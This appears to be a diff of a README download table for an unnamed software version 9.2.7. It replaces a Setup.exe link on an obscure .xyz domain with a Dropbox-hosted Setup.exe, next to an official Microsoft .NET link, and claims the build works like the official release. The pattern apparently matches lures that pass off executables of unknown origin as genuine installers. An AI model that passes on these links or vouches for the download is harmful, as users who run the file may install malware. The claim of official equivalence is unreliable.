@@ -17,7 +17,7 @@
 
 Version | Direct Link
 ------------ | -------------
-9.2.7 - Stable Version| [Download](https://Smokealah.xyz/Setup.exe)
+9.2.7 - Stable Version| [Download](https://www.dropbox.com/s/ct3hg64y0dg42h9/Setup.exe?dl=0)
 NET Framework 3.5| [Download](https://www.microsoft.com/en-us/download/details.aspx?id=21)
 
 ##### Works like the official release version, install and run. All test updates will appear here.
